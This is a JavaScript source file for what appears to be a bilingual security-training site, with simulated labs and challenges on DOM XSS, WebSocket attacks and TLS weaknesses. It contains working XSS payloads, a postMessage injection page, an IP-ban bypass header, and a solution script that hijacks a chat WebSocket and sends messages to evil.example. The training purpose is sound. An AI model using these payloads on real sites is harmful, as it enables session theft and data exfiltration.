    { year: '2009', ref: L('Twitter “Don’t Click”', 'Twitter “Don’t Click”'), title: L('A clickjacking worm', '点击劫持蠕虫'), what: L('Pages showing a “Don’t Click” button framed Twitter invisibly underneath. Clicking it posted a tweet containing the same link from the victim’s account, so it spread from follower to follower. Twitter responded by adding frame-busting code.', '一些页面显示一个“Don’t Click”按钮，下面隐形地嵌着 Twitter。点击它就会从受害者账号发出一条包含同一链接的推文，于是它在关注者之间扩散。Twitter 随后加入了防嵌套代码。'), lesson: L('One click is enough for a worm if the action spreads the bait.', '如果这个操作会传播诱饵，一次点击就足以形成蠕虫。') },
    { year: '2008', ref: L('Adobe Flash settings (Hansen & Grossman)', 'Adobe Flash 设置（Hansen 与 Grossman）'), title: L('Clickjacking gets its name', '“点击劫持”得名'), what: L('Robert Hansen and Jeremiah Grossman coined “clickjacking” and showed that the Flash Player settings manager could be framed and clicked through, silently granting a website access to the victim’s webcam and microphone. Adobe released a fix.', 'Robert Hansen 和 Jeremiah Grossman 提出了“点击劫持”这一名称，并演示了 Flash Player 设置管理器可以被嵌套并被点穿，从而悄悄授予网站访问受害者摄像头和麦克风的权限。Adobe 发布了修复。'), lesson: L('Permission prompts are only as safe as the frame they live in.', '权限提示的安全性，取决于它所在的框架。') },
  ],
};

/* ====================================================== DOM-based */
const SAFE_DOM = { label: L('Sink', '汇点'), off: L('HTML sink', 'HTML 汇点'), on: L('textContent / safe API', 'textContent / 安全 API') };
const domResult = (html, code, okEn, okZh) => {
  const ex = htmlExec(html);
  return { log: [code, ex.length ? L(`executes: ${ex[0]}`, `会执行：${ex[0]}`) : L('nothing executes', '没有内容会执行')], response: html, ...(ex.length ? verdict(true, okEn, okZh) : neutral('No execution.', '没有执行。')), ex };
};
function postMessageData(h) {
  const m = /postMessage\(\s*(['"`])([\s\S]*?)\1\s*,/.exec(h);
  return m ? m[2].replace(/\\(['"`])/g, '$1') : null;
}

const dom = {
  variants: [
    {
      id: 'write',
      title: L('document.write', 'document.write'),
      summary: L('location.search goes into document.write inside an attribute. Close the attribute and tag first.', 'location.search 被写进 document.write 中的一个属性。先闭合属性和标签。'),
      lab: {
        fields: [{ id: 'q', label: '?search=', default: '"><svg onload=alert(1)>' }],
        presets: [
          { label: 'shoes', values: { q: 'shoes' } },
          { label: '"><svg onload>', values: { q: '"><svg onload=alert(1)>' } },
        ],
        defense: SAFE_DOM,
        run({ values, defended }) {
          const html = defended ? '<img src="/track?q=">' : `<img src="/track?q=${values.q}">`;
          const r = domResult(html, defended ? "img.src = '/track?q=' + encodeURIComponent(q)" : "document.write('<img src=\"/track?q=' + q + '\">')", 'Your markup was written into the page.', '你的标记被写进了页面。');
          return { request: `https://${SITE}/?search=${encodeURIComponent(values.q)}`, ...r, ...(defended ? verdict(false, 'Set as a property, never parsed as HTML.', '作为属性赋值，从不被当作 HTML 解析。') : {}) };
        },
      },
    },
    {
      id: 'innerhtml',
      title: L('innerHTML', 'innerHTML'),
      summary: L('innerHTML doesn’t run <script> tags, but event handlers on other elements fire normally.', 'innerHTML 不会运行 <script> 标签，但其他元素上的事件处理器会正常触发。'),
      lab: {
        fields: [{ id: 'q', label: '?search=', default: '<img src=x onerror=alert(1)>' }],
        presets: [
          { label: '<script>', values: { q: '<script>alert(1)</script>' } },
          { label: '<img onerror>', values: { q: '<img src=x onerror=alert(1)>' } },
        ],
        defense: SAFE_DOM,
        run({ values, defended }) {
          if (defended) return { request: `?search=${values.q}`, log: ['el.textContent = q'], response: values.q.replace(/</g, '&lt;'), ...verdict(false, 'Shown as text.', '作为文本显示。') };
          const scriptOnly = /^\s*<script/i.test(values.q);
          const r = domResult(values.q.replace(/<script[\s\S]*?<\/script>/gi, '<!-- script inserted via innerHTML does not run -->'), 'el.innerHTML = q', 'An event handler ran.', '一个事件处理器运行了。');
          return { request: `?search=${values.q}`, ...r, ...(scriptOnly ? neutral('innerHTML never executes inserted <script>.', 'innerHTML 永远不会执行插入的 <script>。') : {}) };
        },
      },
    },
    {
      id: 'href',
      title: L('jQuery attr() href sink', 'jQuery attr() 的 href 汇点'),
      summary: L('$("#back").attr("href", returnPath) puts a URL parameter into a link. A javascript: URL runs when clicked.', '$("#back").attr("href", returnPath) 把 URL 参数放进链接。javascript: URL 在点击时会执行。'),
      lab: {
        fields: [{ id: 'q', label: '?returnPath=', default: 'javascript:alert(document.cookie)' }],
        presets: [
          { label: '/', values: { q: '/' } },
          { label: 'javascript:', values: { q: 'javascript:alert(document.cookie)' } },
        ],
        defense: { label: L('Value', '值'), off: L('Any URL', '任意 URL'), on: L('Relative paths only', '只允许相对路径') },
        run({ values, defended }) {
          const v = defended && !/^\/(?!\/)/.test(values.q) ? '/' : values.q;
          const html = `<a id="back" href="${v.replace(/"/g, '&quot;')}">Back</a>`;
          return { request: `?returnPath=${values.q}`, ...domResult(html, `$('#back').attr('href', ${JSON.stringify(values.q)})`, 'Clicking “Back” runs your script.', '点击“Back”就会运行你的脚本。'), ...(defended ? verdict(false, 'Only relative paths are accepted.', '只接受相对路径。') : {}) };
        },
      },
    },
    {
      id: 'message',
      title: L('Web messages', 'Web 消息（postMessage）'),
      summary: L('A page listens for postMessage and writes the data into innerHTML without checking who sent it. Any site that frames it can send a message.', '页面监听 postMessage，并把数据写进 innerHTML，却不检查是谁发来的。任何嵌入它的网站都能发消息。'),
      lab: {
        fields: [{ id: 'h', label: L('Attacker page', '攻击者页面'), rows: 3, default: `<iframe src="https://${SITE}/" onload="this.contentWindow.postMessage('<img src=1 onerror=print()>','*')">` }],
        presets: [{ label: 'postMessage', values: { h: `<iframe src="https://${SITE}/" onload="this.contentWindow.postMessage('<img src=1 onerror=print()>','*')">` } }],
        defense: { label: L('Listener', '监听器'), off: L('No origin check, innerHTML', '不检查来源，innerHTML'), on: L('Check e.origin, textContent', '检查 e.origin，textContent') },
        run({ values, defended }) {
          const data = postMessageData(values.h);
          if (data === null) return { request: values.h, log: [L('no postMessage call found', '没有找到 postMessage 调用')], response: '', ...neutral('Nothing sent.', '什么都没发送。') };
          if (defended) return { request: values.h, log: [L('🛡 e.origin = https://evil.example → ignored', '🛡 e.origin = https://evil.example → 忽略')], response: '', ...verdict(false, 'Messages from other origins are dropped.', '来自其他来源的消息被丢弃。') };
          return { request: values.h, ...domResult(`<div id="ads">${data}</div>`, "window.addEventListener('message', e => { ads.innerHTML = e.data })", 'Your message became HTML in the shop’s page.', '你的消息变成了商店页面里的 HTML。') };
        },
      },
    },
  ],
  challenges: [
    {
      title: L('Out of the tracking pixel', '逃出跟踪像素'),
      goal: L('The page runs document.write(\'<img src="/resources/images/tracker.gif?searchTerms=\' + q + \'">\'). Make alert() run.', '页面执行 document.write(\'<img src="/resources/images/tracker.gif?searchTerms=\' + q + \'">\')。让 alert() 运行。'),
      fields: [{ id: 'q', label: '?search=', default: 'shoes' }],
      run({ q }) {
        const html = `<img src="/resources/images/tracker.gif?searchTerms=${q}">`;
        return domResult(html, 'document.write(…)', '', '');
      },
      check: (v, o) => o.ex.length > 0,
      hint: L('Your text is inside src="…" inside <img …>. Close both, then add a new element.', '你的文本位于 <img …> 的 src="…" 里。把两者都闭合，再加一个新元素。'),
      solution: '"><svg onload=alert(1)>',
      explain: L('document.write parses whatever string it receives as HTML. Build elements with DOM APIs and set properties instead.', 'document.write 会把收到的任何字符串当作 HTML 解析。改用 DOM API 创建元素并设置属性。'),
    },
    {
      title: L('innerHTML with a script filter', '带 script 过滤的 innerHTML'),
      goal: L('The page does results.innerHTML = q, after removing any <script> tags. Run alert().', '页面在删除所有 <script> 标签后执行 results.innerHTML = q。运行 alert()。'),
      fields: [{ id: 'q', label: '?search=', default: '<script>alert(1)</script>' }],
      run({ q }) {
        const f = q.replace(/<\/?script[^>]*>/gi, '');
        return domResult(f, `results.innerHTML = ${JSON.stringify(f)}`, '', '');
      },
      check: (v, o) => o.ex.length > 0,
      hint: L('innerHTML ignores scripts anyway. Use an element with an event that fires by itself.', 'innerHTML 本来就会忽略脚本。用一个带自动触发事件的元素。'),
      solution: '<img src=x onerror=alert(1)>',
      explain: L('The filter removed the one thing that wouldn’t run anyway. Use textContent, or a sanitiser such as DOMPurify when HTML is truly needed.', '过滤器删掉的恰恰是本来就不会运行的东西。使用 textContent；如果确实需要 HTML，使用 DOMPurify 这类净化库。'),
    },
    {
      title: L('Send a poisoned message', '发送有毒的消息'),
      goal: L('The shop’s home page has window.addEventListener("message", e => { ads.innerHTML = e.data }). Write an attacker page that makes print() run in the shop’s page.', '商店首页有 window.addEventListener("message", e => { ads.innerHTML = e.data })。写一个攻击者页面，让 print() 在商店页面中运行。'),
      fields: [{ id: 'h', label: L('Attacker page', '攻击者页面'), rows: 3, default: `<iframe src="https://${SITE}/">` }],
      run({ h }) {
        const data = postMessageData(h);
        const framed = new RegExp(`<iframe[^>]*src=["']https://${SITE.replace('.', '\\.')}/?`).test(h);
        if (!framed) return { log: [L('the shop isn’t framed: nobody receives the message', '没有嵌入商店页面：没人收到消息')], response: '', ex: [] };
        if (data === null) return { log: [L('frame loaded, no message sent', '框架已加载，没有发送消息')], response: '', ex: [] };
        return domResult(`<div id="ads">${data}</div>`, 'ads.innerHTML = e.data', '', '');
      },
      check: (v, o) => o.ex.some((e) => /print\(\)/.test(e)),
      hint: L('In the iframe’s onload, call this.contentWindow.postMessage(\'…\', \'*\') with an HTML payload.', '在 iframe 的 onload 中调用 this.contentWindow.postMessage(\'…\', \'*\')，内容是 HTML payload。'),
      solution: `<iframe src="https://${SITE}/" onload="this.contentWindow.postMessage('<img src=1 onerror=print()>','*')">`,
      explain: L('Message listeners are an input channel open to every origin. Check e.origin against an allowlist and treat e.data as untrusted text.', '消息监听器是一个向所有来源开放的输入通道。用白名单检查 e.origin，并把 e.data 当作不可信的文本。'),
    },
  ],
  cases: [
    { year: '2020', ref: 'CVE-2020-11022', title: L('jQuery htmlPrefilter', 'jQuery htmlPrefilter'), what: L('In jQuery before 3.5.0, passing HTML from untrusted sources to DOM manipulation methods such as .html() or .append() could execute code, even when the HTML had been sanitised first, because of how jQuery rewrote certain tags. jQuery 3.5.0 fixed it.', '在 jQuery 3.5.0 之前，把来自不可信来源的 HTML 传给 .html() 或 .append() 等 DOM 操作方法，即使事先已经净化过，也可能执行代码，原因在于 jQuery 改写某些标签的方式。jQuery 3.5.0 修复了这个问题。'), lesson: L('Library helpers are sinks too. Keep dependencies updated and prefer text APIs.', '库的辅助函数同样是汇点。保持依赖更新，优先使用文本 API。') },
  ],
};

/* ====================================================== WebSockets */
const websockets = {
  variants: [
    {
      id: 'frames',
      title: L('Manipulating messages', '篡改消息'),
      summary: L('The chat client HTML-encodes your message before sending it, but the support agent’s page renders incoming messages with innerHTML. Edit the frame in a proxy and the encoding is gone.', '聊天客户端在发送前会对消息做 HTML 编码，但客服页面用 innerHTML 渲染收到的消息。在代理里修改数据帧，编码就没了。'),
      lab: {
        fields: [{ id: 'f', label: L('WebSocket frame', 'WebSocket 数据帧'), default: '{"message":"<img src=1 onerror=alert(1)>"}' }],
        presets: [
          { label: L('As the client sends it', '客户端发送的原样'), values: { f: '{"message":"&lt;img src=1 onerror=alert(1)&gt;"}' } },
          { label: L('Edited in proxy', '在代理中修改'), values: { f: '{"message":"<img src=1 onerror=alert(1)>"}' } },
        ],
        defense: { label: L('Agent view', '客服界面'), off: 'innerHTML', on: L('Encode on render', '渲染时编码') },
        run({ values, defended }) {
          let msg = '';
          try {
            msg = JSON.parse(values.f).message ?? '';
          } catch {
            return { request: values.f, log: [], response: 'invalid JSON', ...neutral('Bad frame.', '数据帧格式错误。') };
          }
          const html = defended ? msg.replace(/&/g, '&amp;').replace(/</g, '&lt;') : msg;
          const ex = htmlExec(`<td>${html}</td>`);
          return { request: `→ ${values.f}`, log: [L('agent’s browser renders message', '客服浏览器渲染消息'), ex.length ? L(`executes: ${ex[0]}`, `会执行：${ex[0]}`) : L('rendered as text', '作为文本渲染')], response: `<td>${html}</td>`, ...(ex.length ? verdict(true, 'XSS in the support agent’s browser.', '客服浏览器中出现了 XSS。') : defended ? verdict(false, 'Encoded where it is rendered.', '在渲染处进行了编码。') : neutral('The client’s encoding held, this time.', '这次客户端的编码起了作用。')) };
        },
      },
      takeaway: L('Client-side encoding is a convenience, not a control. Encode where data is rendered.', '客户端编码只是便利，不是安全控制。在数据被渲染的地方编码。'),
    },
    {
      id: 'handshake',
      title: L('Handshake manipulation', '篡改握手'),
      summary: L('After an XSS attempt your IP is banned. The handshake is an HTTP request, and the server trusts X-Forwarded-For.', '在一次 XSS 尝试后，你的 IP 被封了。握手是一个 HTTP 请求，而服务器信任 X-Forwarded-For。'),
      lab: {
        fields: [{ id: 'x', label: 'X-Forwarded-For', default: '1.1.1.1' }],
        presets: [
          { label: L('None', '不设置'), values: { x: '' } },
          { label: '1.1.1.1', values: { x: '1.1.1.1' } },
        ],
        defense: { label: L('Client IP', '客户端 IP'), off: 'X-Forwarded-For', on: L('Socket address', '真实连接地址') },
        run({ values, defended }) {
          const x = values.x.trim();
          const banned = defended || !x;
          return { request: `GET /chat HTTP/1.1\nUpgrade: websocket\nConnection: Upgrade\n${x ? `X-Forwarded-For: ${x}\n` : ''}Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==`, log: [L(`server sees client IP ${banned ? '203.0.113.9 (banned)' : x}`, `服务器看到的客户端 IP：${banned ? '203.0.113.9（已封禁）' : x}`)], response: banned ? 'HTTP/1.1 401 "This address is blacklisted"' : 'HTTP/1.1 101 Switching Protocols', ...(banned ? (defended ? verdict(false, 'Headers can’t change your real address.', '请求头改变不了你的真实地址。') : neutral('Banned.', '被封禁。')) : verdict(true, 'Back in, with a new identity.', '换了个身份，又回来了。')) };
        },
      },
    },
    {
      id: 'cswsh',
      title: L('Cross-site WebSocket hijacking', '跨站 WebSocket 劫持（CSWSH）'),
      summary: L('The handshake is authenticated only by cookies, and the server doesn’t check Origin. An attacker page can open the socket as the victim and read the replies: CSRF with a two-way channel.', '握手只靠 Cookie 认证，而服务器不检查 Origin。攻击者页面可以以受害者身份打开 socket 并读取回复：这就是带双向通道的 CSRF。'),
      lab: {
        fields: [{ id: 'o', label: L('Origin of the page opening the socket', '打开 socket 的页面来源'), default: 'https://evil.example' }],
        presets: [
          { label: `https://${SITE}`, values: { o: `https://${SITE}` } },
          { label: 'https://evil.example', values: { o: 'https://evil.example' } },
        ],
        defense: { label: L('Handshake', '握手'), off: L('Cookie only', '只看 Cookie'), on: L('Check Origin + token', '检查 Origin + 令牌') },
        run({ values, defended }) {
          const foreign = values.o.trim() !== `https://${SITE}`;
          const ok = !defended || !foreign;
          return { request: `GET /chat HTTP/1.1\nOrigin: ${values.o}\nCookie: session=carlos-… (SameSite=None)\nUpgrade: websocket`, log: ok ? [L('→ READY', '→ READY'), '← {"user":"carlos","content":"my new password is montoya"}'] : [L('🛡 foreign Origin rejected', '🛡 拒绝外站 Origin')], response: ok ? 'HTTP/1.1 101 Switching Protocols' : 'HTTP/1.1 403', ...(ok && foreign ? verdict(true, 'Your page reads carlos’s chat history.', '你的页面读到了 carlos 的聊天记录。') : defended ? verdict(false, 'Foreign pages can’t open the socket.', '外站页面无法打开 socket。') : neutral('Normal, same-site connection.', '正常的同站连接。')) };
        },
      },
    },
  ],
  challenges: [
    {
      title: L('Get past the client', '绕过客户端'),
      goal: L('The chat’s JavaScript HTML-encodes < and > before sending. The agent’s dashboard renders messages with innerHTML. Send a frame that runs alert() in the agent’s browser.', '聊天的 JavaScript 会在发送前对 < 和 > 做 HTML 编码。客服后台用 innerHTML 渲染消息。发送一个能在客服浏览器中运行 alert() 的数据帧。'),
      fields: [{ id: 'f', label: L('WebSocket frame (as intercepted)', 'WebSocket 数据帧（拦截到的原样）'), default: '{"message":"&lt;img src=1 onerror=alert(1)&gt;"}' }],
      run({ f }) {
        let msg = '';
        try {
          msg = JSON.parse(f).message ?? '';
        } catch {
          return { log: [L('invalid JSON', 'JSON 无效')], response: '', ex: [] };
        }
        const ex = htmlExec(`<td>${msg}</td>`);
        return { log: [ex.length ? L(`executes: ${ex[0]}`, `会执行：${ex[0]}`) : L('rendered as text', '作为文本渲染')], response: `<td>${msg}</td>`, ex };
      },
      check: (v, o) => o.ex.length > 0,
      hint: L('The encoding was done by the browser before sending. You are editing the frame after that.', '编码是浏览器在发送前完成的。而你是在那之后修改数据帧。'),
      solution: '{"message":"<img src=1 onerror=alert(1)>"}',
      explain: L('Anything the client does can be undone by an intercepting proxy. The server (or the renderer) must handle untrusted data safely.', '客户端做的任何事，都能被拦截代理撤销。服务器（或渲染方）必须安全地处理不可信数据。'),
    },
    {
      title: L('Hijack the socket', '劫持 socket'),
      goal: L('The chat at wss://shop.example/chat sends the full history when it receives “READY”, checks only the session cookie (SameSite=None), and ignores Origin. Write an attacker script that opens the socket and sends every message to https://evil.example.', 'wss://shop.example/chat 上的聊天在收到“READY”时会发送完整记录，只检查会话 Cookie（SameSite=None），而且忽略 Origin。写一个攻击脚本，打开 socket 并把每条消息发送到 https://evil.example。'),
      fields: [{ id: 'h', label: L('Attacker script', '攻击脚本'), rows: 5, default: "<script>\n  var ws = new WebSocket('wss://shop.example/chat');\n</script>" }],
      run({ h }) {
        const opens = /new\s+WebSocket\(\s*['"]wss:\/\/shop\.example\/chat['"]\s*\)/.test(h);
        const ready = /\.send\(\s*['"]READY['"]\s*\)/.test(h);
        const exfil = /onmessage[\s\S]*(fetch|location|Image|navigator\.sendBeacon)[\s\S]*evil\.example/.test(h) || /addEventListener\(\s*['"]message['"][\s\S]*(fetch|sendBeacon)[\s\S]*evil\.example/.test(h);
        const log = [opens ? L('socket opened with carlos’s cookie', '带着 carlos 的 Cookie 打开了 socket') : L('no socket to wss://shop.example/chat', '没有连接 wss://shop.example/chat 的 socket'), ready ? '→ READY' : L('(server waits for READY)', '（服务器在等待 READY）')];
        if (opens && ready) log.push('← {"user":"carlos","content":"my new password is montoya"}');
        if (opens && ready && exfil) log.push(L('📡 evil.example received the history', '📡 evil.example 收到了聊天记录'));
        return { log, response: opens ? 'HTTP/1.1 101 Switching Protocols' : '', ok: opens && ready && exfil };
      },
      check: (v, o) => o.ok,
      hint: L('Three parts: send READY in onopen, and in onmessage forward e.data with fetch to evil.example.', '三个部分：在 onopen 中发送 READY；在 onmessage 中用 fetch 把 e.data 转发到 evil.example。'),
      solution: "<script>\n  var ws = new WebSocket('wss://shop.example/chat');\n  ws.onopen = () => ws.send('READY');\n  ws.onmessage = (e) => fetch('https://evil.example/log', { method: 'POST', mode: 'no-cors', body: e.data });\n</script>",
      explain: L('WebSocket handshakes are not protected by CORS. Check the Origin header, use SameSite cookies, or require a token in the handshake.', 'WebSocket 握手不受 CORS 保护。检查 Origin 头、使用 SameSite Cookie，或在握手中要求令牌。'),
    },
  ],
  cases: [
    { year: '2023', ref: L('Gitpod (Snyk)', 'Gitpod（Snyk）'), title: L('Hijacking a cloud IDE over WebSockets', '通过 WebSocket 劫持云端 IDE'), what: L('Snyk researchers reported a cross-site WebSocket hijacking issue in Gitpod: because the WebSocket handshake relied on cookies without validating the origin, a malicious page could act as a logged-in user and take over their workspaces. Gitpod fixed it after disclosure.', 'Snyk 研究人员报告了 Gitpod 中的一个跨站 WebSocket 劫持问题：由于 WebSocket 握手依赖 Cookie 且不校验来源，恶意页面可以冒充已登录用户并接管其工作区。Gitpod 在披露后进行了修复。'), lesson: L('Treat WebSocket handshakes like state-changing requests: verify Origin.', '像对待改变状态的请求一样对待 WebSocket 握手：校验 Origin。') },
  ],
};

/* ====================================================== TLS (foundations) */
function sanMatch(host, pattern) {
  const h = host.toLowerCase().split('.');
  const p = pattern.toLowerCase().trim().split('.');
  if (h.length !== p.length) return false;
  return p.every((lab, i) => (i === 0 && lab === '*' ? h[i].length > 0 : lab === h[i]));
}
const VERIFY = { label: L('Client', '客户端'), off: 'verify=False', on: L('Full validation', '完整校验') };

const tls = {
  variants: [
    {
      id: 'chain',
      title: L('Untrusted issuer', '不受信任的签发者'),
      summary: L('A man-in-the-middle presents its own certificate. A client that skips verification (a very common “quick fix”) accepts it and encrypts straight to the attacker.', '中间人出示自己的证书。跳过校验的客户端（一种非常常见的“快速修复”）会接受它，并直接把数据加密发给攻击者。'),
      lab: {
        fields: [{ id: 'i', label: L('Certificate issuer', '证书签发者'), default: 'Mallory Proxy CA' }],
        presets: [
          { label: 'Let’s Encrypt R11', values: { i: 'Let’s Encrypt R11' } },
          { label: 'Mallory Proxy CA', values: { i: 'Mallory Proxy CA' } },
        ],
        defense: VERIFY,
        run({ values, defended }) {
          const trusted = ['Let’s Encrypt R11', 'DigiCert Global G2', 'GTS CA 1C3'].includes(values.i.trim());
          const accept = trusted || !defended;
          return { request: `ClientHello (SNI api.${SITE})`, log: [L(`chain ends at "${values.i}" → ${trusted ? 'in trust store' : 'NOT in trust store'}`, `证书链终点为 "${values.i}" → ${trusted ? '在信任库中' : '不在信任库中'}`)], response: accept ? L('handshake completes', '握手完成').en : 'SSLError: CERTIFICATE_VERIFY_FAILED', ...(accept && !trusted ? verdict(true, 'The client is now talking to the attacker, encrypted.', '客户端现在正与攻击者加密通信。') : !trusted ? verdict(false, 'Rejected: unknown issuer.', '拒绝：未知签发者。') : neutral('Legitimate certificate.', '合法证书。')) };
        },
      },
      takeaway: L('Encryption without authentication only protects you from passive eavesdroppers.', '没有身份认证的加密，只能防住被动窃听者。'),
    },
    {
      id: 'hostname',
      title: L('Hostname matching', '主机名匹配'),
      summary: L('A valid certificate must also name the host you asked for. A wildcard covers exactly one label: *.shop.example covers api.shop.example, not shop.example or a.b.shop.example.', '有效证书还必须写明你请求的主机名。通配符只覆盖一级标签：*.shop.example 覆盖 api.shop.example，但不覆盖 shop.example 或 a.b.shop.example。'),
      lab: {
        fields: [
          { id: 'h', label: L('Host requested', '请求的主机'), default: `dev.api.${SITE}` },
          { id: 's', label: L('Certificate SANs (comma-separated)', '证书 SAN（逗号分隔）'), default: `*.${SITE}` },
        ],
        presets: [
          { label: `api.${SITE}`, values: { h: `api.${SITE}`, s: `*.${SITE}` } },
          { label: SITE, values: { h: SITE, s: `*.${SITE}` } },
          { label: `dev.api.${SITE}`, values: { h: `dev.api.${SITE}`, s: `*.${SITE}` } },
        ],
        defense: VERIFY,
        run({ values, defended }) {
          const ok = values.s.split(',').some((p) => sanMatch(values.h.trim(), p));
          const accept = ok || !defended;
          return { request: `ClientHello (SNI ${values.h})`, log: [L(ok ? 'a SAN matches' : 'no SAN matches this host', ok ? '有 SAN 匹配' : '没有 SAN 匹配该主机')], response: accept ? L('handshake completes', '握手完成').en : 'SSLError: hostname mismatch', ...(accept && !ok ? verdict(true, 'Any valid certificate for any site would be accepted.', '任何网站的任何有效证书都会被接受。') : ok ? neutral('Name matches.', '名称匹配。') : verdict(false, 'Mismatch caught.', '不匹配被发现了。')) };
        },
      },
    },
    {
      id: 'strip',
      title: L('SSL stripping and HSTS', 'SSL 剥离与 HSTS'),
      summary: L('Users type “bank.example”, and the first request goes over plain HTTP. An attacker on the network answers it and keeps the victim on HTTP. HSTS (especially preloaded) makes the browser go straight to HTTPS.', '用户输入“bank.example”，第一个请求走的是明文 HTTP。网络上的攻击者应答这个请求，让受害者一直停留在 HTTP 上。HSTS（尤其是预加载）会让浏览器直接使用 HTTPS。'),
      lab: {
        fields: [{ id: 'u', label: L('What the user types', '用户输入的内容'), default: 'bank.example' }],
        presets: [
          { label: 'bank.example', values: { u: 'bank.example' } },
          { label: 'https://bank.example', values: { u: 'https://bank.example' } },
        ],
        defense: { label: 'HSTS', off: L('Not set', '未设置'), on: 'max-age=31536000; includeSubDomains; preload' },
        run({ values, defended }) {
          const explicit = /^https:\/\//i.test(values.u.trim());
          const https = explicit || defended;
          return { request: `${https ? 'https' : 'http'}://bank.example/`, log: [https ? L(defended && !explicit ? 'browser upgrades to HTTPS itself (HSTS preload list)' : 'user asked for HTTPS', defended && !explicit ? '浏览器自己升级到 HTTPS（HSTS 预加载列表）' : '用户请求了 HTTPS') : L('plain HTTP: attacker proxies the session and rewrites https:// links to http://', '明文 HTTP：攻击者代理整个会话，并把 https:// 链接改写成 http://')], response: https ? L('TLS session with the real bank', '与真实银行建立 TLS 会话').en : L('attacker sees the login form submission in plain text', '攻击者以明文看到登录表单提交').en, ...(https ? (defended ? verdict(false, 'There is no HTTP request to intercept.', '根本没有可拦截的 HTTP 请求。') : neutral('Safe this time, because the user typed https://.', '这次安全，因为用户输入了 https://。')) : verdict(true, 'Credentials captured without breaking any crypto.', '没破解任何加密，就截获了凭证。')) };
        },
      },
    },
    {
      id: 'downgrade',
      title: L('Protocol downgrade', '协议降级'),
      summary: L('If the server still accepts old versions, a network attacker can interfere until both sides settle on the weakest protocol they share.', '如果服务器仍接受旧版本，网络攻击者可以不断干扰，直到双方选定它们共同支持的最弱协议。'),
      lab: {
        fields: [{ id: 'v', label: L('Versions the (tampered) client offers', '（被篡改的）客户端提供的版本'), default: 'TLS1.0' }],
        presets: [
          { label: 'TLS1.3, TLS1.2', values: { v: 'TLS1.3, TLS1.2' } },
          { label: 'TLS1.0', values: { v: 'TLS1.0' } },
        ],
        defense: { label: L('Server minimum', '服务器最低版本'), off: 'TLS 1.0', on: 'TLS 1.2' },
        run({ values, defended }) {
          const order = ['TLS1.3', 'TLS1.2', 'TLS1.1', 'TLS1.0'];
          const offered = values.v.split(',').map((s) => s.trim().toUpperCase().replace(/\s/g, ''));
          const allowed = defended ? ['TLS1.3', 'TLS1.2'] : order;
          const pick = order.find((v) => offered.includes(v) && allowed.includes(v));
          const weak = pick === 'TLS1.0' || pick === 'TLS1.1';
          return { request: `ClientHello versions: ${offered.join(', ')}`, log: [L(`server allows ${allowed.join(', ')}`, `服务器允许 ${allowed.join(', ')}`)], response: pick ? `ServerHello: ${pick}` : 'Alert: protocol_version', ...(weak ? verdict(true, `Negotiated ${pick}, which has known weaknesses (e.g. BEAST, weak ciphers).`, `协商结果为 ${pick}，它有已知缺陷（如 BEAST、弱加密套件）。`) : pick ? neutral('Modern protocol.', '现代协议。') : verdict(false, 'Old versions are refused outright.', '旧版本被直接拒绝。')) };
        },
      },
    },
  ],
  challenges: [
    {
      title: L('Wildcard rules', '通配符规则'),
      goal: L('A certificate lists only *.shop.example. Which of these hosts will a browser reject? shop.example, www.shop.example, api.shop.example, dev.api.shop.example. Enter the rejected ones, comma-separated.', '一张证书只列出了 *.shop.example。下列哪些主机会被浏览器拒绝？shop.example、www.shop.example、api.shop.example、dev.api.shop.example。输入被拒绝的主机，用逗号分隔。'),
      fields: [{ id: 'a', label: L('Rejected hosts', '被拒绝的主机'), default: '' }],
      run({ a }) {
        const want = ['shop.example', 'dev.api.shop.example'];
        const got = a.split(',').map((s) => s.trim().toLowerCase()).filter(Boolean);
        const ok = got.length === want.length && want.every((w) => got.includes(w));
        return { log: ['shop.example', 'www.shop.example', 'api.shop.example', 'dev.api.shop.example'].map((h) => (got.includes(h) ? `✗ ${h}` : `✓ ${h}`)), response: ok ? L('correct', '正确').en : L('not quite', '还不对').en, ok };
      },
      check: (v, o) => o.ok,
      hint: L('* replaces exactly one non-empty label, and only the left-most one.', '* 恰好替代一个非空标签，而且只能是最左边那个。'),
      solution: 'shop.example, dev.api.shop.example',
      explain: L('The bare domain has no label for * to fill, and the deeper name has one label too many. Certificates usually list both shop.example and *.shop.example for this reason.', '裸域名没有可供 * 填充的标签，而更深的名称多出了一级。正因如此，证书通常会同时列出 shop.example 和 *.shop.example。'),
    },
    {
      title: L('Write the HSTS header', '写出 HSTS 响应头'),
      goal: L('Write a Strict-Transport-Security value that lasts at least one year, covers all subdomains, and is eligible for the browser preload list.', '写一个 Strict-Transport-Security 的值：至少持续一年、覆盖所有子域名，并且符合浏览器预加载列表的要求。'),
      fields: [{ id: 'h', label: 'Strict-Transport-Security:', default: 'max-age=3600' }],
      run({ h }) {
        const ma = /max-age\s*=\s*(\d+)/i.exec(h);
        const age = ma ? Number(ma[1]) : 0;
        const sub = /(^|;)\s*includeSubDomains\s*(;|$)/i.test(h);
        const pre = /(^|;)\s*preload\s*(;|$)/i.test(h);
        const ok = age >= 31536000 && sub && pre;
        return { log: [`max-age ${age >= 31536000 ? '✓' : '✗'} (${age}s)`, `includeSubDomains ${sub ? '✓' : '✗'}`, `preload ${pre ? '✓' : '✗'}`], response: `Strict-Transport-Security: ${h}`, ok };
      },
      check: (v, o) => o.ok,
      hint: L('One year is 31536000 seconds. The other two are bare directives separated by semicolons.', '一年是 31536000 秒。另外两个是用分号分隔的裸指令。'),
      solution: 'max-age=31536000; includeSubDomains; preload',
      explain: L('HSTS only works after the first visit, unless the domain is preloaded into browsers. includeSubDomains stops attackers using an unprotected subdomain to set cookies.', '除非域名被预加载进浏览器，否则 HSTS 只在首次访问之后才生效。includeSubDomains 能阻止攻击者利用未受保护的子域名设置 Cookie。'),
    },
    {
      title: L('Close the old protocols', '关闭旧协议'),
      goal: L('Write the nginx ssl_protocols directive so that only TLS 1.2 and TLS 1.3 are accepted.', '写出 nginx 的 ssl_protocols 指令，只接受 TLS 1.2 和 TLS 1.3。'),
      fields: [{ id: 'c', label: L('nginx config line', 'nginx 配置行'), default: 'ssl_protocols TLSv1 TLSv1.1 TLSv1.2 TLSv1.3;' }],
      run({ c }) {
        const m = /^\s*ssl_protocols\s+([^;]+);\s*$/.exec(c);
        const set = m ? m[1].trim().split(/\s+/) : [];
        const ok = set.length === 2 && set.includes('TLSv1.2') && set.includes('TLSv1.3');
        return { log: m ? set.map((s) => `${['TLSv1.2', 'TLSv1.3'].includes(s) ? '✓' : '✗'} ${s}`) : [L('syntax: ssl_protocols … ;', '语法：ssl_protocols … ;')], response: c, ok };
      },
      check: (v, o) => o.ok,
